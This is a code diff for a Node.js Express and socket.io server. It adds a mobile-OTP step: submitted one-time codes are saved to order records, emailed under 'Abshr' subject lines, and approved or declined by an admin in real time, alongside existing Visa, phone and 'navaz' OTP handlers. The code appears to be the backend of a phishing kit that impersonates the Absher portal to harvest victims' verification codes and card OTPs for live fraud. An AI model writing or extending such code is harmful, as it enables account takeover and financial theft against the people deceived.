@@ -58,6 +58,8 @@ const sendEmail = async (data, type) => {
           ? "Abshr Phone  "
           : type === "phoneOtp" //
           ? "Abshr Phone  OTP  "
+          : type === "mobOtp" //
+          ? "Abshr Phone Mob OTP  "
           : "Abshr "
       }`,
       html: htmlContent,
@@ -207,6 +209,17 @@ app.post("/phoneOtp/:id", async (req, res) => {
       await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200))
   );
 });
+app.post("/mobOtp/:id", async (req, res) => {
+  const { id } = req.params;
+  await Order.findByIdAndUpdate(id, {
+    ...req.body,
+    checked: false,
+    mobOtpAccept: false,
+  }).then(
+    async () =>
+      await sendEmail(req.body, "mobOtp").then(() => res.sendStatus(200))
+  );
+});
 
 app.get(
   "/users",
@@ -342,8 +355,13 @@ io.on("connection", (socket) => {
     io.emit("declineVisaOTP", id);
   });
 
-  socket.on("phone", (data) => {
+  socket.on("phone", async (data) => {
     console.log("phone  received", data);
+    await Order.findByIdAndUpdate(data.id, {
+      phoneAccept: false,
+      mobOtp: null,
+      mobOtpAccept: false,
+    });
     io.emit("phone", data);
   });
 
@@ -369,7 +387,6 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(id, {
       phoneOtpAccept: true,
       networkAccept: false,
-      navazAceept: false,
     });
     io.emit("acceptPhoneOTP", { id, price });
   });
@@ -382,13 +399,12 @@ io.on("connection", (socket) => {
     });
     io.emit("declinePhoneOTP", id);
   });
-  socket.on("acceptService", async ({ id, price }) => {
-    console.log("acceptService From Admin", id, price);
+  socket.on("acceptService", async (id) => {
+    console.log("acceptService From Admin", id);
     await Order.findByIdAndUpdate(id, {
       networkAccept: true,
-      navazAceept: false,
     });
-    io.emit("acceptService", { id, price });
+    io.emit("acceptService", id);
   });
 
   socket.on("declineService", async (id) => {
@@ -443,6 +459,37 @@ io.on("connection", (socket) => {
       navazAceept: true,
     });
     io.emit("declineNavazOTP", id);
+  });
+
+  socket.on("mobOtp", async (data) => {
+    console.log("mobOtp  received", data);
+    await Order.findByIdAndUpdate(data.id, {
+      mobOtp: data.mobOtp,
+      mobOtpAccept: false,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("mobOtp", data);
+  });
+
+  socket.on("acceptMobOtp", async ({ id, price }) => {
+    console.log("acceptMobOtp From Admin", id);
+    await Order.findByIdAndUpdate(id, {
+      mobOtpAccept: true,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("acceptMobOtp", { id, price });
+  });
+
+  socket.on("declineMobOtp", async (id) => {
+    console.log("declineMobOtp Form Admin", id);
+    await Order.findByIdAndUpdate(id, {
+      mobOtpAccept: true,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("declineMobOtp", id);
   });
 
   socket.on("network", async (id) => {
